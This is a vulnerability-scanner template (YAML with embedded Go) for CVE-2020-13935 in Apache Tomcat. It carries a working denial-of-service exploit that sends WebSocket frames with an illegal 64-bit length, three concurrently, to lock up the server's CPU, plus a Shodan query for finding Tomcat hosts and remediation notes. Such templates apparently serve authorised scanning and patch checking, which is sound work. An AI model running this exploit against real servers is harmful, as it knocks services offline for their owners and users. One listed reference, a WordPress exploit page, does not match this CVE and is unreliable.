code:
- engine:
  - bash
  - sh
  - powershell
  - powershell.exe
  - cmd
  - cmd.exe
  source: 'go get github.com/gorilla/websocket@v1.4.2

    '
- args:
  - run
  engine:
  - go
  matchers:
  - condition: and
    internal: true
    part: response
    type: word
    words:
    - 'Sent message: {{randstr}}'
    - 'Received message: {{randstr}}'
  pattern: '*.go'
  source: "package main\n\nimport (\n  \"fmt\"\n  \"net/url\"\n  \"time\"\n  \"os\"\
    \n\n  \"github.com/gorilla/websocket\"\n)\n\nfunc main() {\n  var inputURL string\n\
    \  fmt.Scanln(&inputURL)\n\n  parsedURL, err := url.Parse(inputURL)\n  if err\
    \ != nil {\n    fmt.Fprintln(os.Stderr, \"Invalid URL:\", err)\n    return\n \
    \ }\n\n  u := url.URL{Scheme: \"ws\", Host: parsedURL.Host, Path: \"/examples/websocket/echoProgrammatic\"\
    }\n\n  conn, _, err := websocket.DefaultDialer.Dial(u.String(), nil)\n  if err\
    \ != nil {\n    fmt.Fprintln(os.Stderr, \"Failed to connect:\", err)\n    return\n\
    \  }\n  defer conn.Close()\n\n  message, exists := os.LookupEnv(\"random_message\"\
    )\n  if !exists {\n    return\n  }\n\n  err = conn.WriteMessage(websocket.TextMessage,\
    \ []byte(message))\n  if err != nil {\n    fmt.Fprintln(os.Stderr, \"Failed to\
    \ send message:\", err)\n    return\n  }\n  fmt.Fprintln(os.Stdout, \"Sent message:\"\
    , string(message))\n\n  _, response, err := conn.ReadMessage()\n  if err != nil\
    \ {\n    fmt.Fprintln(os.Stderr, \"Failed to read message:\", err)\n    return\n\
    \  }\n  fmt.Fprintln(os.Stdout, \"Received message:\", string(response))\n}\n"
- args:
  - run
  engine:
  - go
  matchers:
  - dsl:
    - 'contains_all(stderr, ''read tcp'', ''i/o timeout'') && !contains(stderr, ''websocket:
      close 1002 (protocol error): An invalid WebSocket frame was received - the most
      significant bit of a 64-bit payload was illegally set'')'
    type: dsl
  pattern: '*.go'
  source: "/****************************************\n*                          \
    \            *\n*  RedTeam Pentesting GmbH             *\n*  kontakt@redteam-pentesting.de\
    \       *\n*  https://www.redteam-pentesting.de/  *\n*                       \
    \               *\n****************************************/\n\npackage main\n\
    \nimport (\n  \"bytes\"\n  \"fmt\"\n  \"os\"\n  \"sync\"\n  \"time\"\n  \"net/url\"\
    \n\n  \"github.com/gorilla/websocket\"\n)\n\n// CVE-2020-13935\n//\n// this program\
    \ exploits a bug in tomcat which leads to continuous,\n// high cpu usage if all\
    \ bits of the length field of a websocket message\n// are set to 1.\n//\n// Affected\
    \ Versions:\n// 10.0.0-M1 to 10.0.0-M6\n// 9.0.0.M1 to 9.0.36\n// 8.5.0 to 8.5.56\n\
    // 8.0.1 to 8.0.53\n// 7.0.27 to 7.0.104\n//\n// see:\n// https://bz.apache.org/bugzilla/show_bug.cgi?id=64563\n\
    // https://access.redhat.com/security/cve/CVE-2020-13935\n\nfunc main() {\n  if\
    \ err := run(); err != nil {\n    fmt.Fprintln(os.Stderr, err)\n  }\n}\n\nfunc\
    \ sendInvalidWebSocketMessage(url string) error {\n  ws, _, err := websocket.DefaultDialer.Dial(url,\
    \ nil)\n\n  if err != nil {\n    return fmt.Errorf(\"dial: %s\", err)\n  }\n\n\
    \  // +-+-+-+-+-------+-+-------------+-------------------------------+\n  //\
    \  0                   1                   2                   3\n  //  0 1 2\
    \ 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n  // +-+-+-+-+-------+-+-------------+-------------------------------+\n\
    \  // |F|R|R|R| opcode|M| Payload len |    Extended payload length    |\n  //\
    \ |I|S|S|S|  (4)  |A|     (7)     |             (16/64)           |\n  // |N|V|V|V|\
    \       |S|             |   (if payload len==126/127)   |\n  // | |1|2|3|    \
    \   |K|             |                               |\n  // +-+-+-+-+-------+-+-------------+\
    \ - - - - - - - - - - - - - - - +\n  // |     Extended payload length continued,\
    \ if payload len == 127  |\n  // + - - - - - - - - - - - - - - - +-------------------------------+\n\
    \  // |                               | Masking-key, if MASK set to 1 |\n  //\
    \ +-------------------------------+-------------------------------+\n  // | Masking-key\
    \ (continued)       |          Payload Data         |\n  // +--------------------------------\
    \ - - - - - - - - - - - - - - - +\n  // :                     Payload Data continued\
    \ ...                :\n  // + - - - - - - - - - - - - - - - - - - - - - - - -\
    \ - - - - - - - +\n  // |                     Payload Data continued ...     \
    \           |\n  // +---------------------------------------------------------------+\n\
    \n  var buf bytes.Buffer\n\n  fin := 1\n  rsv1 := 0\n  rsv2 := 0\n  rsv3 := 0\n\
    \  opcode := websocket.TextMessage\n\n  buf.WriteByte(byte(fin<<7 | rsv1<<6 |\
    \ rsv2<<5 | rsv3<<4 | opcode))\n\n  // always set the mask bit\n  // indicate\
    \ 64 bit message length\n  buf.WriteByte(byte(1<<7 | 0b1111111))\n\n  // set msb\
    \ to 1, violating the spec and triggering the bug\n  buf.Write([]byte{0xFF, 0xFF,\
    \ 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF})\n\n  // 4 byte masking key\n  // leave\
    \ zeros for now, so we do not need to mask\n  maskingKey := []byte{0, 0, 0, 0}\n\
    \  buf.Write(maskingKey)\n\n  // write an incomplete message\n  message, exists\
    \ := os.LookupEnv(\"random_message\")\n  if !exists {\n    return nil\n  }\n\n\
    \  buf.WriteString(message)\n\n  _, err = ws.UnderlyingConn().Write(buf.Bytes())\n\
    \  if err != nil {\n    return fmt.Errorf(\"write: %s\", err)\n  }\n\n  ws.SetReadDeadline(time.Now().Add(7\
    \ * time.Second))\n  _, response, err := ws.ReadMessage()\n  if err != nil {\n\
    \    return fmt.Errorf(\"read: %s\", err)\n  }\n\n  fmt.Fprintln(os.Stdout, \"\
    Received message:\", string(response))\n\n  return nil\n}\n\nfunc run() error\
    \ {\n  var inputURL string\n  fmt.Scanln(&inputURL)\n\n  parsedURL, err := url.Parse(inputURL)\n\
    \  if err != nil {\n    fmt.Fprintln(os.Stderr, err)\n    return nil\n  }\n\n\
    \  u := url.URL{Scheme: \"ws\", Host: parsedURL.Host, Path: \"/examples/websocket/echoProgrammatic\"\
    }\n  targetURL := u.String()\n\n  var wg sync.WaitGroup\n\n  for i := 0; i < 3;\
    \ i++ {\n    wg.Add(1)\n    go func() {\n      defer wg.Done()\n\n      if err\
    \ := sendInvalidWebSocketMessage(targetURL); err != nil {\n        fmt.Fprintln(os.Stderr,\
    \ err)\n      }\n    }()\n  }\n\n  wg.Wait()\n\n  return nil\n}\n"
flow: http(1) && code(1,2) && code (3)
http:
- matchers:
  - dsl:
    - status_code == 200
    - 'contains(body, "<title>Apache Tomcat WebSocket Examples: Echo</title>")'
    internal: true
    type: dsl
  method: GET
  path:
  - '{{RootURL}}/examples/websocket/echo.xhtml'
id: CVE-2020-13935
info:
  author: sttlr
  classification:
    cve-id: CVE-2020-13935
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    epss-percentile: 0.99663
    epss-score: 0.91745
  description: 'Apache Tomcat versions 10.0.0-M1 to 10.0.0-M6, 9.0.0.M1 to 9.0.36,
    8.5.0 to 8.5.56, and 7.0.27 to 7.0.104 contain a vulnerability in the WebSocket
    module where the payload length of WebSocket frames is not correctly validated.
    This can lead to an infinite loop when processing frames with invalid payload
    lengths. Attackers can exploit this flaw by sending multiple malicious requests,
    resulting in a denial of service (DoS) on the affected Tomcat instance.

    '
  impact: 'Attackers can cause a denial of service by sending malicious WebSocket
    frames, leading to application unavailability.

    '
  metadata:
    product: tomcat
    shodan-query: html:"Apache Tomcat"
    vendor: apache
  name: Apache Tomcat WebSocket Frame Payload Length Validation Denial of Service
  reference:
  - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00084.html
  - http://lists.opensuse.org/opensuse-security-announce/2020-07/msg00088.html
  - http://packetstormsecurity.com/files/161213/WordPress-5.0.0-Remote-Code-Execution.html
  - https://kc.mcafee.com/corporate/index?page=content&id=SB10332
  - https://lists.apache.org/thread.html/r4e5d3c09f4dd2923191e972408b40fb8b42dbff0bc7904d44b651e50%40%3Cusers.tomcat.apache.org%3E
  - https://security.netapp.com/advisory/ntap-20200724-0003/
  - https://github.com/RedTeamPentesting/CVE-2020-13935
  remediation: 'Upgrade Apache Tomcat to version 10.0.0-M7, 9.0.37, 8.5.57, or 7.0.105
    or later that properly validates WebSocket frame payload lengths.

    '
  severity: high
  tags: cve,cve2020,tomcat,websocket,dos,code,vuln
variables:
  random_message: '{{randstr}}'
